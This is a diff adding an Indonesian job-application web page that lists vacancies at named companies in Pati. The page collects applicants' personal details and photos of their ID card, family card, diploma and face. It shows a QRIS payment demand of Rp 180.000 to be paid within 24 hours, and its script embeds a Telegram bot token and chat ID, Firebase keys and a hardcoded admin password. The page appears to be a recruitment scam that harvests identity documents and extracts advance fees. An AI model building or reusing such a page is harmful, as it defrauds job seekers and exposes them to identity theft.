@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Pendaftaran Kerja</title>
+    <!-- Memuat Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Memuat Font Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; font-size: 14px; background-color: #f8fafc; }
+        .ultracompact-font { font-size: 12px; }
+        .input-ultracompact { padding: 4px 8px; font-size: 0.75rem; border-radius: 4px; border: 1px solid #e5e7eb; width: 100%; background-color: #f9fafb; transition: all 0.2s; }
+        .input-ultracompact:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 1px #3b82f6; }
+        .input-ultracompact:disabled { background-color: #f3f4f6; cursor: not-allowed; }
+        .auto-resize-textarea { resize: none; overflow-y: hidden; }
+        .label-ultracompact { display: block; font-size: 0.625rem; font-weight: 600; color: #6b7280; margin-bottom: 1px; text-transform: uppercase; }
+        .file-input { display: none; }
+        .upload-placeholder { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80px; border: 1px solid #e5e7eb; border-radius: 8px; cursor: pointer; background-color: #f9fafb; transition: all 0.2s; }
+        .upload-placeholder:hover { background-color: #f0f4f8; border-color: #cbd5e1; }
+        .preview-container { position: relative; display: none; }
+        .live-preview-img { width: 100%; height: 80px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 1px solid #e5e7eb; }
+        .delete-btn { position: absolute; top: -6px; right: -6px; width: 20px; height: 20px; background-color: #ef4444; color: white; border-radius: 9999px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; cursor: pointer; border: 1px solid white; }
+        #choiceModal, #cameraModal, #previewModal, #adminDetailModal, #qrisModal { display: none; }
+        .hidden-page { display: none; }
+        .menu-card { background-color: white; border-radius: 0.75rem; padding: 1.5rem; border: 1px solid #e5e7eb; transition: transform 0.2s, box-shadow 0.2s; cursor: pointer; }
+        .menu-card:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+
+        /* --- CSS Untuk Status Tracker --- */
+        .status-tracker { display: flex; align-items: flex-start; justify-content: space-between; position: relative; margin: 1.5rem 0; }
+        .status-tracker::before { content: ''; position: absolute; top: 10px; left: 15%; right: 15%; height: 4px; background-color: #e5e7eb; z-index: 1; }
+        #status-progress-bar { position: absolute; top: 10px; left: 15%; height: 4px; background-color: #3b82f6; z-index: 2; transition: width 0.5s ease-in-out; border-radius: 2px; }
+        .status-step { display: flex; flex-direction: column; align-items: center; text-align: center; width: 30%; position: relative; z-index: 3; }
+        .status-dot { width: 24px; height: 24px; border-radius: 50%; background-color: #e5e7eb; border: 4px solid white; transition: all 0.3s ease; }
+        .status-label { margin-top: 0.5rem; font-size: 0.75rem; font-weight: 500; color: #6b7280; }
+        .status-step.completed .status-dot { background-color: #3b82f6; }
+        .status-step.active .status-dot { background-color: #3b82f6; transform: scale(1.1); box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.3); }
+        .status-step.completed .status-label { font-weight: 600; color: #1f2937; }
+        .status-step.active .status-label { font-weight: 700; color: #3b82f6; }
+        .status-step.result-diterima.completed .status-dot { background-color: #16a34a; }
+        .status-step.result-diterima .status-label { color: #16a34a; font-weight: 700; }
+        .status-step.result-ditolak.completed .status-dot { background-color: #dc2626; }
+        .status-step.result-ditolak .status-label { color: #dc2626; font-weight: 700; }
+
+        /* --- CSS Untuk Panel Admin --- */
+        .admin-table { width: 100%; border-collapse: collapse; }
+        .admin-table th, .admin-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #e5e7eb; }
+        .admin-table th { background-color: #f9fafb; font-size: 12px; font-weight: 600; color: #4b5563; text-transform: uppercase; }
+        .admin-table tbody tr:hover { background-color: #f9fafb; }
+        .status-badge { padding: 2px 8px; border-radius: 9999px; font-size: 11px; font-weight: 600; text-transform: capitalize; }
+        .status-diajukan { background-color: #dbeafe; color: #1e40af; }
+        .status-diproses { background-color: #fef3c7; color: #92400e; }
+        .status-diterima { background-color: #dcfce7; color: #166534; }
+        .status-ditolak { background-color: #fee2e2; color: #991b1b; }
+    </style>
+</head>
+<body class="bg-slate-50">
+
+    <!-- Halaman 0: Menu Utama Profesional -->
+    <div id="mainMenuPage">
+         <div class="min-h-screen flex flex-col items-center justify-center p-4 bg-gradient-to-br from-blue-50 to-indigo-100">
+             <div class="w-full max-w-md text-center">
+                 <h1 class="text-3xl font-bold text-gray-800">Isi Formulir Pendaftaran</h1>
+                 <p class="text-base text-gray-600 mt-2 mb-8">Temukan & lacak kesempatan karir Anda bersama kami.</p>
+                 <div class="space-y-4">
+                     <div id="goToRegisterBtn" class="menu-card flex items-start space-x-4 text-left"><div class="flex-shrink-0 bg-blue-100 text-blue-600 p-3 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg></div><div><h2 class="font-bold text-base text-gray-900">Daftar Pekerjaan</h2><p class="text-sm text-gray-500 mt-1">Isi formulir untuk melamar pekerjaan di lokasi yang tersedia.</p></div></div>
+                     <div id="goToCheckStatusBtn" class="menu-card flex items-start space-x-4 text-left"><div class="flex-shrink-0 bg-green-100 text-green-600 p-3 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg></div><div><h2 class="font-bold text-base text-gray-900">Cek Kode Pendaftaran</h2><p class="text-sm text-gray-500 mt-1">Periksa status lamaran Anda menggunakan kode unik.</p></div></div>
+                 </div>
+                 <p class="text-xs text-gray-400 mt-10">&copy; 2024 Portal Karir. <a href="#" id="adminLoginLink" class="underline">Admin</a></p>
+             </div>
+         </div>
+    </div>
+
+    <!-- Halaman Admin Login -->
+    <div id="adminLoginPage" class="hidden-page">
+        <div class="min-h-screen flex items-center justify-center p-4">
+            <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-sm">
+                <button type="button" class="back-to-menu text-sm text-blue-600 font-semibold p-2 -ml-2">&lt; Kembali</button>
+                <h2 class="text-xl font-bold text-center text-gray-800 mb-4">Login Admin</h2>
+                <input type="password" id="adminPasswordInput" class="input-ultracompact w-full text-base p-2" placeholder="Masukkan Kata Sandi...">
+                <button id="adminLoginBtn" class="w-full mt-3 bg-gray-800 text-white font-semibold py-2 rounded-md hover:bg-gray-900 text-sm">Masuk</button>
+                <p id="adminLoginError" class="text-red-500 text-xs text-center mt-2 h-4"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman Panel Admin -->
+    <div id="adminPanelPage" class="hidden-page">
+        <div class="p-4 sm:p-6 lg:p-8 w-full max-w-7xl mx-auto">
+            <div class="sm:flex sm:items-center sm:justify-between mb-6">
+                <div>
+                    <h1 class="text-2xl font-bold text-gray-900">Panel Admin</h1>
+                    <p class="mt-1 text-sm text-gray-500">Kelola semua data lamaran yang masuk.</p>
+                </div>
+                <button type="button" class="back-to-menu mt-4 sm:mt-0 text-sm text-blue-600 font-semibold p-2">Keluar & Kembali ke Menu</button>
+            </div>
+            <div class="mb-4">
+                 <input type="text" id="adminSearchInput" class="input-ultracompact w-full max-w-xs text-sm p-2" placeholder="Cari nama atau kode...">
+            </div>
+            <div class="bg-white rounded-lg shadow-sm overflow-x-auto">
+                <table id="applicationsTable" class="admin-table ultracompact-font">
+                    <thead>
+                        <tr>
+                            <th class="whitespace-nowrap">Pelamar</th>
+                            <th class="whitespace-nowrap">Perusahaan</th>
+                            <th class="whitespace-nowrap">Tanggal Daftar</th>
+                            <th class="whitespace-nowrap">Status</th>
+                            <th class="whitespace-nowrap">Ubah Status</th>
+                            <th class="whitespace-nowrap">Aksi</th>
+                        </tr>
+                    </thead>
+                    <tbody id="applicationsList">
+                        <!-- Data akan dimuat di sini oleh JavaScript -->
+                    </tbody>
+                </table>
+                 <div id="adminLoadingState" class="text-center p-10 text-gray-500"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman Cek Status Pendaftaran -->
+    <div id="statusCheckPage" class="hidden-page">
+        <div class="min-h-screen flex items-center justify-center p-4">
+            <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-md">
+                <button type="button" class="back-to-menu text-sm text-blue-600 font-semibold p-2 -ml-2">&lt; Kembali ke Menu</button>
+                <h1 class="text-xl font-bold text-center text-gray-800 mb-4">Cek Status Lamaran</h1>
+                <div class="space-y-3">
+                    <input type="text" id="kodeInput" class="input-ultracompact w-full text-base p-2" placeholder="Masukkan kode pendaftaran contoh: REG-73BMEH">
+                    <button id="checkStatusCodeBtn" class="w-full bg-green-600 text-white font-semibold py-2 rounded-md hover:bg-green-700 text-sm">Cek Status</button>
+                </div>
+                <div id="statusResult" class="mt-6 border-t pt-6"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman Pemilihan Lokasi Kerja -->
+    <div id="selectionPage" class="hidden-page">
+        <div class="min-h-screen flex items-center justify-center p-4">
+            <div class="bg-white p-4 my-4 mx-auto rounded-lg shadow-md w-full max-w-md">
+                <button type="button" class="back-to-menu text-sm text-blue-600 font-semibold p-2 -ml-2">&lt; Kembali ke Menu</button>
+                <h1 class="text-xl font-bold text-center text-gray-800 mb-1">Pilih Lokasi Kerja</h1>
+                <p class="text-sm text-center text-gray-500 mb-6">Silakan pilih perusahaan yang Anda minati.</p>
+                <div class="space-y-4">
+                    <div class="border rounded-lg p-4 transition-shadow hover:shadow-lg"><h2 class="font-bold text-base text-gray-900">PT. Dua Kelinci</h2><p class="text-xs text-gray-500 mt-1">Jl. Kudus - Pati No.Km 6, Bumirejo, Margorejo, Pati</p><div class="mt-3 text-xs space-y-1"><p><span class="font-semibold">Kebutuhan:</span></p><p>• 16 Laki-laki</p><p>• 25 Perempuan</p></div><button class="apply-btn w-full mt-4 bg-blue-600 text-white font-semibold py-2 rounded-md hover:bg-blue-700 text-sm" data-company="PT. Dua Kelinci">Daftar</button></div>
+                    <div class="border rounded-lg p-4 transition-shadow hover:shadow-lg"><h2 class="font-bold text-base text-gray-900">PT. Sejin Fashion Indonesia</h2><p class="text-xs text-gray-500 mt-1">Jl. Kudus - Pati No.KM.7, Wangunrejo, Margorejo, Pati</p><div class="mt-3 text-xs space-y-1"><p><span class="font-semibold">Kebutuhan:</span></p><p>• 5 Laki-laki</p><p>• 12 Perempuan</p></div><button class="apply-btn w-full mt-4 bg-blue-600 text-white font-semibold py-2 rounded-md hover:bg-blue-700 text-sm" data-company="PT. Sejin Fashion Indonesia">Daftar</button></div>
+                    <div class="border rounded-lg p-4 transition-shadow hover:shadow-lg"><h2 class="font-bold text-base text-gray-900">PT. Gudang Garam Tbk</h2><p class="text-xs text-gray-500 mt-1">Gintungan, Sukokulon, Margorejo, Pati</p><div class="mt-3 text-xs space-y-1"><p><span class="font-semibold">Kebutuhan:</span></p><p>• 10 Laki-laki</p><p>• 10 Perempuan</p></div><button class="apply-btn w-full mt-4 bg-blue-600 text-white font-semibold py-2 rounded-md hover:bg-blue-700 text-sm" data-company="PT. Gudang Garam Tbk">Daftar</button></div>
+                    <div class="border rounded-lg p-4 transition-shadow hover:shadow-lg"><h2 class="font-bold text-base text-gray-900">PT. Starindo Jaya Packaging</h2><p class="text-xs text-gray-500 mt-1">Jl. Kudus - Pati No.KM 9, Wangunrejo, Margorejo, Pati</p><div class="mt-3 text-xs space-y-1"><p><span class="font-semibold">Kebutuhan:</span></p><p>• 5 Perempuan</p></div><button class="apply-btn w-full mt-4 bg-blue-600 text-white font-semibold py-2 rounded-md hover:bg-blue-700 text-sm" data-company="PT. Starindo Jaya Packaging">Daftar</button></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman Formulir Pendaftaran -->
+    <div id="formPage" class="hidden-page">
+        <div class="min-h-screen flex items-center justify-center p-4">
+            <div class="bg-white p-3 my-2 mx-auto rounded-md shadow-sm w-full max-w-md ultracompact-font">
+                <div class="flex items-center mb-2">
+                    <button type="button" id="backToSelectionBtn" class="text-sm text-blue-600 font-semibold p-2 -ml-2">&lt; Kembali</button>
+                    <h1 class="text-lg font-bold text-center flex-grow">Formulir Lamaran</h1>
+                </div>
+                <form id="jobApplicationForm" novalidate class="mt-1">
+                    <input type="hidden" id="selectedCompany" name="Perusahaan Dilamar">
+                    <fieldset class="border-t border-gray-200 pt-2"><legend class="text-sm font-semibold text-gray-900">Data Diri</legend><div class="grid grid-cols-2 gap-x-2 gap-y-2 mt-1"><div class="col-span-2"><label for="namaLengkap" class="label-ultracompact">Nama Lengkap</label><input type="text" id="namaLengkap" name="Nama Lengkap" class="input-ultracompact" required></div><div><label for="tempatLahir" class="label-ultracompact">Tempat Lahir</label><input type="text" id="tempatLahir" name="Tempat Lahir" placeholder="Kota" class="input-ultracompact" required></div><div><label for="tanggalLahir" class="label-ultracompact">Tgl. Lahir</label><input type="date" id="tanggalLahir" name="Tanggal Lahir" class="input-ultracompact" required></div><div><label for="telepon" class="label-ultracompact">Telepon (WA)</label><input type="tel" id="telepon" name="Nomor Telepon" placeholder="08..." class="input-ultracompact" required></div><div><label for="email" class="label-ultracompact">Email</label><input type="email" id="email" name="Alamat Email" class="input-ultracompact" required></div></div></fieldset>
+                    <fieldset class="border-t border-gray-200 pt-2 mt-3"><legend class="text-sm font-semibold text-gray-900">Alamat Lengkap</legend><div class="grid grid-cols-2 gap-x-2 gap-y-2 mt-1"><div><label for="provinsi" class="label-ultracompact">Provinsi</label><select id="provinsi" name="Provinsi" class="input-ultracompact" required></select></div><div><label for="kota" class="label-ultracompact">Kota/Kabupaten</label><select id="kota" name="Kota/Kabupaten" class="input-ultracompact" required disabled></select></div><div><label for="kecamatan" class="label-ultracompact">Kecamatan</label><select id="kecamatan" name="Kecamatan" class="input-ultracompact" required disabled></select></div><div><label for="kelurahan" class="label-ultracompact">Kelurahan/Desa</label><select id="kelurahan" name="Kelurahan/Desa" class="input-ultracompact" required disabled></select></div><div class="col-span-2"><label for="detailAlamat" class="label-ultracompact">Detail Alamat</label><textarea id="detailAlamat" name="Detail Alamat" rows="2" class="input-ultracompact auto-resize-textarea" placeholder="Contoh: Jl. Merdeka No. 15, RT 01/RW 02" required></textarea></div></div></fieldset>
+                    <fieldset class="border-t border-gray-200 pt-2 mt-3"><legend class="text-sm font-semibold text-gray-900">Pendidikan & Keahlian</legend><div class="grid grid-cols-2 gap-x-2 gap-y-2 mt-1"><div><label for="pendidikan" class="label-ultracompact">Terakhir</label><select id="pendidikan" name="Pendidikan Terakhir" class="input-ultracompact" required><option value="" disabled selected>Pilih...</option><option value="SMA/SMK">SMA/SMK</option><option value="Diploma">Diploma</option><option value="S1">S1</option><option value="S2">S2/S3</option></select></div><div><label for="jurusan" class="label-ultracompact">Jurusan</label><input type="text" id="jurusan" name="Jurusan" class="input-ultracompact" required></div><div class="col-span-2"><label for="pengalaman" class="label-ultracompact">Pengalaman Kerja</label><textarea id="pengalaman" name="Pengalaman Kerja" rows="1" placeholder="Jelaskan dengan jelas" class="input-ultracompact auto-resize-textarea" required></textarea></div><div class="col-span-2"><label for="keterampilan" class="label-ultracompact">Keahlian</label><textarea id="keterampilan" name="Keterampilan/Keahlian" rows="1" placeholder="Contoh: MS Office, Desain..." class="input-ultracompact auto-resize-textarea" required></textarea></div></div></fieldset>
+                    <fieldset class="border-t border-gray-200 pt-2 mt-3"><legend class="text-sm font-semibold text-gray-900">Dokumen</legend><div class="grid grid-cols-2 gap-4 mt-1"><div class="space-y-1"><label class="label-ultracompact text-center">Foto KTP</label><div id="upload-box-fotoKTP" class="upload-placeholder" data-target="fotoKTP"><svg class="h-6 w-6 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg><span class="text-xs text-gray-500 mt-1">Unggah File</span></div><div id="preview-container-fotoKTP" class="preview-container"><img id="live-preview-fotoKTP" class="live-preview-img" data-target="fotoKTP"><button type="button" class="delete-btn" onclick="deleteFile('fotoKTP')">&times;</button></div><input type="file" id="file-fotoKTP" data-target="fotoKTP" class="file-input" accept="image/*"></div><div class="space-y-1"><label class="label-ultracompact text-center">Foto Kartu Keluarga</label><div id="upload-box-fotoKK" class="upload-placeholder" data-target="fotoKK"><svg class="h-6 w-6 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg><span class="text-xs text-gray-500 mt-1">Unggah File</span></div><div id="preview-container-fotoKK" class="preview-container"><img id="live-preview-fotoKK" class="live-preview-img" data-target="fotoKK"><button type="button" class="delete-btn" onclick="deleteFile('fotoKK')">&times;</button></div><input type="file" id="file-fotoKK" data-target="fotoKK" class="file-input" accept="image/*"></div><div class="space-y-1"><label class="label-ultracompact text-center">Foto Ijazah</label><div id="upload-box-fotoIjazah" class="upload-placeholder" data-target="fotoIjazah"><svg class="h-6 w-6 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg><span class="text-xs text-gray-500 mt-1">Unggah File</span></div><div id="preview-container-fotoIjazah" class="preview-container"><img id="live-preview-fotoIjazah" class="live-preview-img" data-target="fotoIjazah"><button type="button" class="delete-btn" onclick="deleteFile('fotoIjazah')">&times;</button></div><input type="file" id="file-fotoIjazah" data-target="fotoIjazah" class="file-input" accept="image/*"></div><div class="space-y-1"><label class="label-ultracompact text-center">Foto Wajah</label><div id="upload-box-fotoWajah" class="upload-placeholder" data-target="fotoWajah"><svg class="h-6 w-6 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg><span class="text-xs text-gray-500 mt-1">Unggah File</span></div><div id="preview-container-fotoWajah" class="preview-container"><img id="live-preview-fotoWajah" class="live-preview-img" data-target="fotoWajah"><button type="button" class="delete-btn" onclick="deleteFile('fotoWajah')">&times;</button></div><input type="file" id="file-fotoWajah" data-target="fotoWajah" class="file-input" accept="image/*"></div></div></fieldset>
+                    <div class="mt-4"><button type="submit" class="w-full bg-blue-600 text-white font-bold py-2 px-4 rounded-md hover:bg-blue-700">Kirim Formulir</button></div>
+                    <div id="statusMessage" class="mt-2 text-center text-xs font-medium h-4"></div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman 3: Sukses Pendaftaran -->
+    <div id="successPage" class="hidden-page">
+        <div class="min-h-screen flex items-center justify-center p-4">
+            <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-md text-center">
+                <h1 class="text-xl font-bold text-green-600">Pendaftaran Berhasil!</h1>
+                <div class="my-6 p-3 bg-gray-100 border-dashed border-2 border-gray-300 rounded-lg">
+                    <p class="text-sm text-gray-500">Kode Pendaftaran Anda:</p>
+                    <p id="registrationCodeDisplay" class="text-2xl font-bold text-gray-800 tracking-widest"></p>
+                </div>
+                <p class="text-sm text-gray-600 mt-4">
+                    Harap simpan kode pendaftaran ini baik-baik untuk mengecek status pendaftaran Anda. Jika diterima, perusahaan akan menghubungi nomor WhatsApp Anda.
+                </p>
+                <button class="back-to-menu w-full mt-6 bg-blue-600 text-white font-semibold py-2 rounded-md hover:bg-blue-700 text-sm">Kembali ke Menu Utama</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Semua Modal (Pilihan, Kamera, Pratinjau) -->
+    <div id="choiceModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center p-4 z-40"><div class="bg-white rounded-lg shadow-xl w-full max-w-xs p-4"><h3 class="text-base font-semibold text-center mb-4">Pilih Sumber Gambar</h3><div class="space-y-2"><button id="galleryButton" class="w-full px-4 py-2 bg-blue-500 text-white rounded-md">Pilih dari Galeri</button><button id="cameraButton" class="w-full px-4 py-2 bg-green-500 text-white rounded-md">Ambil Foto Langsung</button><button id="cancelChoiceButton" class="w-full px-4 py-2 mt-4 bg-gray-200 text-gray-800 rounded-md">Batal</button></div></div></div>
+    <div id="cameraModal" class="fixed inset-0 bg-black bg-opacity-75 flex-col items-center justify-center p-4 z-50"><video id="cameraFeed" class="w-full max-w-md h-auto rounded-md" playsinline></video><canvas id="cameraCanvas" class="hidden"></canvas><div class="flex space-x-4 mt-4"><button id="captureButton" class="px-6 py-2 bg-blue-600 text-white font-medium rounded-full">Jepret</button><button id="closeCameraButton" class="px-6 py-2 bg-gray-600 text-white font-medium rounded-full">Tutup</button></div></div>
+    <div id="previewModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50"><div class="bg-white rounded-lg shadow-xl w-full max-w-md max-h-full overflow-y-auto"><div class="p-4 border-b"><h2 class="text-lg font-bold">Harap pastikan data yang anda kirimkan benar</h2></div><div class="p-4 space-y-3 text-sm"><div id="previewTextData" class="space-y-1"></div><hr><h3 class="font-semibold text-base">Dokumen Terlampir</h3><div id="previewImageData" class="grid grid-cols-2 gap-2"><div><p class="label-ultracompact">Foto KTP</p><img id="modal-preview-fotoKTP" class="w-full h-auto rounded border bg-gray-100"></div><div><p class="label-ultracompact">Foto KK</p><img id="modal-preview-fotoKK" class="w-full h-auto rounded border bg-gray-100"></div><div><p class="label-ultracompact">Foto Ijazah</p><img id="modal-preview-fotoIjazah" class="w-full h-auto rounded border bg-gray-100"></div><div><p class="label-ultracompact">Foto Wajah</p><img id="modal-preview-fotoWajah" class="w-full h-auto rounded border bg-gray-100"></div></div></div><div class="p-3 bg-gray-50 border-t flex justify-end gap-2"><button id="editButton" class="px-4 py-2 bg-gray-200 text-gray-800 text-sm font-medium rounded-md">Edit Lagi</button><button id="sendButton" class="px-4 py-2 bg-green-600 text-white text-sm font-medium rounded-md">Kirim Sekarang</button></div></div></div>
+    
+    <!-- Modal Detail Pelamar (Admin) -->
+    <div id="adminDetailModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-2xl max-h-[90vh] flex flex-col">
+            <div class="p-4 border-b flex justify-between items-center">
+                <h2 id="detailModalTitle" class="text-lg font-bold">Detail Pelamar</h2>
+                <button id="closeDetailModalBtn" class="text-gray-400 hover:text-gray-600">&times;</button>
+            </div>
+            <div id="detailModalContent" class="p-6 space-y-4 overflow-y-auto">
+                <!-- Konten detail akan dimuat di sini -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal QRIS Payment -->
+    <div id="qrisModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-xs flex flex-col">
+            <div class="p-4 rounded-t-lg" style="background-color: #DC2626;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/QRIS_logo.svg" alt="QRIS Logo" class="h-8 mx-auto">
+            </div>
+            <div class="p-6 bg-gray-50 text-center">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzDPbhz4wHREgv0Eq3iy9lPdf5UtXd7pS24KL-Nc_FqT9LdRR8vF0ax_xk1l40lHg86_qpkKNWSOlp0WagxI0_rRXGeVTN7MU5jjHrFEipDfs0ysPNZDz2IWgjAUe92WDlZjR5Gx2E15xTzzElrygZCszZUP-Dps-db4O95ZSFD6GKV2Qkes5SYWTo1Lk/s1600/IMG_20250629_202856.jpg" alt="QR Code" class="w-48 h-48 mx-auto border-4 border-white shadow-md">
+                <p class="mt-4 text-sm font-semibold text-gray-700">Harap di bayarkan maximal 1x24jam</p>
+                <div id="countdownTimer" class="mt-2 text-xl font-mono font-bold text-gray-800 tracking-wider"></div>
+                <p class="mt-2 text-sm font-semibold text-gray-700">Jumlah Pembayaran:</p>
+                <p class="text-2xl font-bold text-blue-800">Rp 180.000</p>
+            </div>
+            <div class="p-4 border-t flex justify-center">
+                <button id="closeQrisModalBtn" class="w-full px-4 py-2 bg-gray-600 text-white text-sm font-medium rounded-md hover:bg-gray-700">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="module">
+        // --- Import Firebase ---
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+        import { getFirestore, collection, addDoc, query, where, getDocs, doc, updateDoc, orderBy } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
+
+        // --- Konfigurasi Firebase ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyA2WEyWXYlk6L5XAlP1zg-oh5ZXL9ZT_rM",
+            authDomain: "formulir-pendaftaran-5e3ec.firebaseapp.com",
+            projectId: "formulir-pendaftaran-5e3ec",
+            storageBucket: "formulir-pendaftaran-5e3ec.appspot.com",
+            messagingSenderId: "785541508226",
+            appId: "1:785541508226:web:2a7481a71638cc9bccd89b",
+            measurementId: "G-WGHEPRLE5N"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // --- ELEMEN DOM ---
+        const mainMenuPage = document.getElementById('mainMenuPage');
+        const selectionPage = document.getElementById('selectionPage');
+        const formPage = document.getElementById('formPage');
+        const statusCheckPage = document.getElementById('statusCheckPage');
+        const successPage = document.getElementById('successPage');
+        const adminLoginPage = document.getElementById('adminLoginPage');
+        const adminPanelPage = document.getElementById('adminPanelPage');
+        
+        const goToRegisterBtn = document.getElementById('goToRegisterBtn');
+        const goToCheckStatusBtn = document.getElementById('goToCheckStatusBtn');
+        const backToSelectionBtn = document.getElementById('backToSelectionBtn');
+        const selectedCompanyInput = document.getElementById('selectedCompany');
+        const form = document.getElementById('jobApplicationForm');
+        const statusMessage = document.getElementById('statusMessage');
+        const provinsiSelect = document.getElementById('provinsi'), kotaSelect = document.getElementById('kota'), kecamatanSelect = document.getElementById('kecamatan'), kelurahanSelect = document.getElementById('kelurahan');
+        const choiceModal = document.getElementById('choiceModal'), galleryButton = document.getElementById('galleryButton'), cameraButton = document.getElementById('cameraButton'), cancelChoiceButton = document.getElementById('cancelChoiceButton');
+        const cameraModal = document.getElementById('cameraModal'), cameraFeed = document.getElementById('cameraFeed'), cameraCanvas = document.getElementById('cameraCanvas'), captureButton = document.getElementById('captureButton'), closeCameraButton = document.getElementById('closeCameraButton');
+        const previewModal = document.getElementById('previewModal'), editButton = document.getElementById('editButton'), sendButton = document.getElementById('sendButton'), previewTextData = document.getElementById('previewTextData');
+        const registrationCodeDisplay = document.getElementById('registrationCodeDisplay');
+        const kodeInput = document.getElementById('kodeInput');
+        const checkStatusCodeBtn = document.getElementById('checkStatusCodeBtn');
+        const statusResult = document.getElementById('statusResult');
+        const adminLoginLink = document.getElementById('adminLoginLink');
+        const adminPasswordInput = document.getElementById('adminPasswordInput');
+        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const adminLoginError = document.getElementById('adminLoginError');
+        const applicationsList = document.getElementById('applicationsList');
+        const adminSearchInput = document.getElementById('adminSearchInput');
+        const adminLoadingState = document.getElementById('adminLoadingState');
+        const adminDetailModal = document.getElementById('adminDetailModal');
+        const closeDetailModalBtn = document.getElementById('closeDetailModalBtn');
+        const detailModalTitle = document.getElementById('detailModalTitle');
+        const detailModalContent = document.getElementById('detailModalContent');
+        const qrisModal = document.getElementById('qrisModal');
+        const closeQrisModalBtn = document.getElementById('closeQrisModalBtn');
+        const countdownTimer = document.getElementById('countdownTimer');
+
+        // --- STATE & KONFIGURASI ---
+        const BOT_TOKEN = '8066046272:AAGxVYbiLGIMpJdShz5MS_-S4Im4UB93yjk';
+        const CHAT_ID = '7348139166';
+        const API_WILAYAH_URL = 'https://www.emsifa.com/api-wilayah-indonesia/api';
+        const ADMIN_PASSWORD = "wasalamL050";
+        let capturedFiles = {};
+        let currentUploadTarget = null;
+        let currentCameraStream;
+        let allApplicationsData = []; 
+        let countdownInterval = null;
+        
